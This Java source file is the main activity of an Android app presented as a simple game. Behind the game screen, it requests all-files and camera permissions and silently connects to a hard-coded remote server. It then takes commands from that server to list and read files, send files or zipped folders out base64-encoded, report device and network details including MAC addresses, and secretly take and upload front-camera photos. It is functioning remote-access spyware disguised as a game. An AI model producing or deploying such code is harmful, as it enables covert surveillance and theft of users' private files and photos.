package com.zer.simplegame;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.nio.charset.StandardCharsets;
import java.util.Enumeration;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class MainActivity extends Activity {

    private static final String TAG = "SimpleGame";

    private static final String SERVER_IP = "***********";
    private static final int SERVER_PORT = 8433;

    private static final int REQUEST_ALL_FILES_PERMISSION = 101;

    private GameView gameView;
    private Socket socket;

    private File currentDirectory;
    private boolean permissionRequested = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        createGameUI();
        checkAndRequestPermissions();
        connectToServer();
    }

    // =========================================================
    // UI
    // =========================================================

    private void createGameUI() {
        gameView = new GameView(this);
        setContentView(gameView);
    }

    // =========================================================
    // Permissions
    // =========================================================

    private void requestAllFilesPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_ALL_FILES_PERMISSION);
            } catch (Exception e) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivityForResult(intent, REQUEST_ALL_FILES_PERMISSION);
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(
                    new String[]{
                            Manifest.permission.READ_EXTERNAL_STORAGE,
                            Manifest.permission.WRITE_EXTERNAL_STORAGE,
                            Manifest.permission.CAMERA
                    },
                    REQUEST_ALL_FILES_PERMISSION
            );
        }
    }

    private boolean hasAllFilesPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return Environment.isExternalStorageManager();
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED;
        } else {
            return true;
        }
    }

    private void checkAndRequestPermissions() {
        if (hasAllFilesPermission()) {
            if (currentDirectory == null) {
                currentDirectory = Environment.getExternalStorageDirectory();
            }
        } else if (!permissionRequested) {
            permissionRequested = true;
            requestAllFilesPermission();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_ALL_FILES_PERMISSION) {
            checkAndRequestPermissions();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_ALL_FILES_PERMISSION) {
            checkAndRequestPermissions();
        }
    }

    // =========================================================
    // Network
    // =========================================================

    private void connectToServer() {
        new Thread(() -> {
            try {
                socket = new Socket();

                socket.connect(
                        new InetSocketAddress(SERVER_IP, SERVER_PORT),
                        5000
                );

                socket.setSoTimeout(30000);

                Log.i(TAG, "Connected!");

                BufferedReader reader =
                        new BufferedReader(
                                new InputStreamReader(
                                        socket.getInputStream(),
                                        StandardCharsets.UTF_8
                                )
                        );

                BufferedWriter writer =
                        new BufferedWriter(
                                new OutputStreamWriter(
                                        socket.getOutputStream(),
                                        StandardCharsets.UTF_8
                                )
                        );

                send(writer, "ANDROID_GAME_CONNECTED\n[END_OF_RESPONSE]");

                String command;

                while ((command = reader.readLine()) != null) {
                    Log.d(TAG, "Command: " + command);

                    String response = handleCommand(command);

                    send(writer, response + "\n[END_OF_RESPONSE]");
                }

            } catch (IOException e) {
                Log.e(TAG, "Connection error", e);

            } finally {
                closeSocket();
            }
        }).start();
    }

    // =========================================================
    // Commands
    // =========================================================

    private String handleCommand(String command) {

        if (command.equals("help")) {
            return "Available Commands:\n" +
                    "  help         - Show this help message\n" +
                    "  ping         - Test connectivity (returns PONG)\n" +
                    "  info         - Show Android OS, API level, manufacturer & model\n" +
                    "  id           - Show process UID and PID\n" +
                    "  ifconfig     - Show network interfaces, IP and MAC addresses\n" +
                    "  pwd / cd     - Show current directory path\n" +
                    "  cd <path>    - Change current directory\n" +
                    "  ls           - List files and subdirectories in current directory\n" +
                    "  scp <target> - Download a file or directory\n" +
                    "  open_camera  - Capture selfie photo and download";
        }

        if (command.equals("ping")) {
            return "PONG";
        }

        if (command.equals("ifconfig")) {
            return getNetworkInfo();
        }

        if (command.equals("info")) {
            return "Android: " +
                    android.os.Build.VERSION.RELEASE +
                    "\nAPI: " +
                    android.os.Build.VERSION.SDK_INT +
                    "\nManufacturer: " +
                    android.os.Build.MANUFACTURER +
                    "\nModel: " +
                    android.os.Build.MODEL;
        }

        if (command.equals("id")) {
            int uid = android.os.Process.myUid();
            int pid = android.os.Process.myPid();

            return "uid=" + uid +
                    " pid=" + pid +
                    " (Android app process)";
        }

        if (command.equals("ls") ||
                command.equals("LIST_FILES")) {
            return listCurrentDirectory();
        }

        if (command.equals("pwd") ||
                command.equals("cd")) {
            return getCurrentDirectoryPath();
        }

        if (command.startsWith("cd ")) {
            String target = command.substring(3).trim();
            return changeDirectory(target);
        }

        if (command.equals("scp")) {
            return "USAGE: scp <file_or_directory>";
        }

        if (command.startsWith("scp ")) {
            String targetPath = command.substring(4).trim();
            return handleScp(targetPath);
        }

        if (command.equals("open_camera") || command.equals("camera") || command.equals("selfie")) {
            return captureSelfie();
        }

        if (command.startsWith("READ_FILE:")) {
            String filename =
                    command.substring("READ_FILE:".length()).trim();

            return readSelectedFile(filename);
        }

        return "UNKNOWN_COMMAND";
    }

    // =========================================================
    // Camera Selfie Capture
    // =========================================================

    @SuppressWarnings("deprecation")
    private int getFrontCameraId() {
        int numberOfCameras = Camera.getNumberOfCameras();
        for (int i = 0; i < numberOfCameras; i++) {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(i, info);
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                return i;
            }
        }
        return 0;
    }

    @SuppressWarnings("deprecation")
    private String captureSelfie() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.CAMERA}, REQUEST_ALL_FILES_PERMISSION);
                return "ERROR: Camera permission requested. Please accept permission and run open_camera again.";
            }
        }

        int cameraId = getFrontCameraId();
        final CountDownLatch latch = new CountDownLatch(1);
        final String[] result = new String[1];

        runOnUiThread(() -> {
            Camera camera = null;
            SurfaceTexture surfaceTexture = null;
            try {
                camera = Camera.open(cameraId);
                surfaceTexture = new SurfaceTexture(10);
                camera.setPreviewTexture(surfaceTexture);
                camera.startPreview();

                final Camera finalCamera = camera;
                final SurfaceTexture finalSurfaceTexture = surfaceTexture;

                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                    try {
                        finalCamera.takePicture(null, null, (data, cam) -> {
                            try {
                                String filename = "selfie_" + System.currentTimeMillis() + ".jpg";
                                File dcimDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
                                if (!dcimDir.exists()) {
                                    dcimDir.mkdirs();
                                }
                                File selfieFile = new File(dcimDir, filename);
                                try (FileOutputStream fos = new FileOutputStream(selfieFile)) {
                                    fos.write(data);
                                }

                                String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
                                result[0] = "SCP_BEGIN:FILE:" + filename + ":" + data.length + "\n"
                                        + base64 + "\n"
                                        + "SCP_END";
                            } catch (Exception e) {
                                result[0] = "ERROR: Failed to save selfie: " + e.getMessage();
                            } finally {
                                try {
                                    cam.stopPreview();
                                    cam.release();
                                    finalSurfaceTexture.release();
                                } catch (Exception ignored) {}
                                latch.countDown();
                            }
                        });
                    } catch (Exception e) {
                        result[0] = "ERROR: takePicture failed: " + e.getMessage();
                        try {
                            finalCamera.stopPreview();
                            finalCamera.release();
                            finalSurfaceTexture.release();
                        } catch (Exception ignored) {}
                        latch.countDown();
                    }
                }, 500);

            } catch (Exception e) {
                if (camera != null) {
                    try {
                        camera.stopPreview();
                        camera.release();
                    } catch (Exception ignored) {}
                }
                if (surfaceTexture != null) {
                    try { surfaceTexture.release(); } catch (Exception ignored) {}
                }
                result[0] = "ERROR: Camera open failed: " + e.getMessage();
                latch.countDown();
            }
        });

        try {
            latch.await(10, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            return "ERROR: Camera capture timed out";
        }

        return result[0] != null ? result[0] : "ERROR: Camera capture failed";
    }

    // =========================================================
    // SCP (Send file or directory to server)
    // =========================================================

    private String handleScp(String targetPath) {
        if (!hasAllFilesPermission()) {
            return "NO_PERMISSION_GRANTED";
        }

        if (currentDirectory == null) {
            currentDirectory = Environment.getExternalStorageDirectory();
        }

        if (targetPath.isEmpty()) {
            return "USAGE: scp <file_or_directory>";
        }

        File target;
        if (targetPath.startsWith("/")) {
            target = new File(targetPath);
        } else {
            target = new File(currentDirectory, targetPath);
        }

        if (!target.exists()) {
            return "ERROR: scp: " + targetPath + ": No such file or directory";
        }

        try {
            if (target.isFile()) {
                long size = target.length();
                byte[] bytes = readFileBytes(target);
                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                return "SCP_BEGIN:FILE:" + target.getName() + ":" + size + "\n"
                        + base64 + "\n"
                        + "SCP_END";
            } else if (target.isDirectory()) {
                byte[] zipBytes = zipDirectory(target);
                String base64 = Base64.encodeToString(zipBytes, Base64.NO_WRAP);
                return "SCP_BEGIN:DIR:" + target.getName() + ".zip:" + zipBytes.length + "\n"
                        + base64 + "\n"
                        + "SCP_END";
            } else {
                return "ERROR: scp: " + targetPath + ": Not a regular file or directory";
            }
        } catch (Exception e) {
            Log.e(TAG, "SCP error", e);
            return "ERROR: scp failed: " + e.getMessage();
        }
    }

    private byte[] readFileBytes(File file) throws IOException {
        long length = file.length();
        if (length > 100 * 1024 * 1024) { // 100MB safety limit
            throw new IOException("File too large to send over SCP: " + file.getName());
        }
        byte[] bytes = new byte[(int) length];
        try (FileInputStream fis = new FileInputStream(file)) {
            int offset = 0;
            int numRead;
            while (offset < bytes.length && (numRead = fis.read(bytes, offset, bytes.length - offset)) >= 0) {
                offset += numRead;
            }
        }
        return bytes;
    }

    private byte[] zipDirectory(File directory) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ZipOutputStream zos = new ZipOutputStream(baos)) {
            zipFolderRecursive(directory, directory.getName(), zos);
        }
        return baos.toByteArray();
    }

    private void zipFolderRecursive(File fileToZip, String fileNameInZip, ZipOutputStream zos) throws IOException {
        if (fileToZip.isHidden()) {
            return;
        }
        if (fileToZip.isDirectory()) {
            if (!fileNameInZip.endsWith("/")) {
                fileNameInZip += "/";
            }
            zos.putNextEntry(new ZipEntry(fileNameInZip));
            zos.closeEntry();
            File[] children = fileToZip.listFiles();
            if (children != null) {
                for (File childFile : children) {
                    zipFolderRecursive(childFile, fileNameInZip + childFile.getName(), zos);
                }
            }
            return;
        }

        try (FileInputStream fis = new FileInputStream(fileToZip)) {
            ZipEntry zipEntry = new ZipEntry(fileNameInZip);
            zos.putNextEntry(zipEntry);
            byte[] bytes = new byte[8192];
            int length;
            while ((length = fis.read(bytes)) >= 0) {
                zos.write(bytes, 0, length);
            }
        }
    }

    // =========================================================
    // Network information
    // =========================================================

    private String getNetworkInfo() {
        StringBuilder result = new StringBuilder();

        try {
            Enumeration<NetworkInterface> interfaces =
                    NetworkInterface.getNetworkInterfaces();

            while (interfaces.hasMoreElements()) {
                NetworkInterface networkInterface =
                        interfaces.nextElement();

                result.append(networkInterface.getName())
                        .append("\n");

                byte[] mac =
                        networkInterface.getHardwareAddress();

                if (mac != null) {
                    result.append("    MAC: ");

                    for (int i = 0; i < mac.length; i++) {
                        result.append(
                                String.format(
                                        "%02X",
                                        mac[i] & 0xff
                                )
                        );

                        if (i < mac.length - 1) {
                            result.append(":");
                        }
                    }

                    result.append("\n");
                } else {
                    result.append("    MAC: unavailable\n");
                }

                Enumeration<InetAddress> addresses =
                        networkInterface.getInetAddresses();

                while (addresses.hasMoreElements()) {
                    InetAddress address = addresses.nextElement();

                    result.append("    IP: ")
                            .append(address.getHostAddress())
                            .append("\n");
                }

                result.append("\n");
            }

        } catch (SocketException e) {
            return "ERROR: " + e.getMessage();
        }

        return result.toString();
    }

    // =========================================================
    // PWD
    // =========================================================

    private String getCurrentDirectoryPath() {
        if (!hasAllFilesPermission()) {
            return "NO_PERMISSION_GRANTED";
        }

        if (currentDirectory == null) {
            currentDirectory = Environment.getExternalStorageDirectory();
        }

        return currentDirectory.getAbsolutePath();
    }

    // =========================================================
    // LS
    // =========================================================

    private String listCurrentDirectory() {
        if (!hasAllFilesPermission()) {
            return "NO_PERMISSION_GRANTED";
        }

        if (currentDirectory == null) {
            currentDirectory = Environment.getExternalStorageDirectory();
        }

        try {
            File[] files = currentDirectory.listFiles();

            if (files == null) {
                return "ERROR: Cannot access or list directory";
            }

            if (files.length == 0) {
                return "DIRECTORY_EMPTY";
            }

            StringBuilder result = new StringBuilder();

            for (File file : files) {
                if (file.isDirectory()) {
                    result.append("[DIR] ");
                } else {
                    result.append("[FILE] ");
                }

                result.append(file.getName())
                        .append("\n");
            }

            return result.toString();

        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    // =========================================================
    // CD
    // =========================================================

    private String changeDirectory(String target) {

        if (!hasAllFilesPermission()) {
            return "NO_PERMISSION_GRANTED";
        }

        if (currentDirectory == null) {
            currentDirectory = Environment.getExternalStorageDirectory();
        }

        if (target.isEmpty() || target.equals(".")) {
            return currentDirectory.getAbsolutePath();
        }

        File newDir;
        if (target.startsWith("/")) {
            newDir = new File(target);
        } else {
            newDir = new File(currentDirectory, target);
        }

        try {
            newDir = newDir.getCanonicalFile();
        } catch (IOException e) {
            newDir = newDir.getAbsoluteFile();
        }

        if (newDir.exists() && newDir.isDirectory()) {
            currentDirectory = newDir;
            return currentDirectory.getAbsolutePath();
        }

        return "cd: no such directory: " + target;
    }

    // =========================================================
    // READ FILE
    // =========================================================

    private String readSelectedFile(String filename) {

        if (!hasAllFilesPermission()) {
            return "NO_PERMISSION_GRANTED";
        }

        if (currentDirectory == null) {
            currentDirectory = Environment.getExternalStorageDirectory();
        }

        if (filename.isEmpty()) {
            return "INVALID_FILENAME";
        }

        try {
            File file;
            if (filename.startsWith("/")) {
                file = new File(filename);
            } else {
                file = new File(currentDirectory, filename);
            }

            if (!file.exists()) {
                return "FILE_NOT_FOUND";
            }

            if (file.isDirectory()) {
                return "NOT_A_FILE";
            }

            BufferedReader reader =
                    new BufferedReader(
                            new InputStreamReader(
                                    new FileInputStream(file),
                                    StandardCharsets.UTF_8
                            )
                    );

            StringBuilder content = new StringBuilder();
            String line;

            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }

            reader.close();

            return content.toString();

        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    // =========================================================
    // Helpers
    // =========================================================

    private void send(
            BufferedWriter writer,
            String message) throws IOException {

        writer.write(message);
        writer.newLine();
        writer.flush();
    }

    private void closeSocket() {
        if (socket != null) {
            try {
                socket.close();
            } catch (IOException ignored) {
            }
        }
    }

    // =========================================================
    // Activity lifecycle
    // =========================================================

    @Override
    protected void onResume() {
        super.onResume();

        checkAndRequestPermissions();

        if (gameView != null) {
            gameView.resume();
        }
    }

    @Override
    protected void onPause() {
        super.onPause();

        if (gameView != null) {
            gameView.pause();
        }
    }

    @Override
    protected void onDestroy() {
        closeSocket();
        super.onDestroy();
    }
}
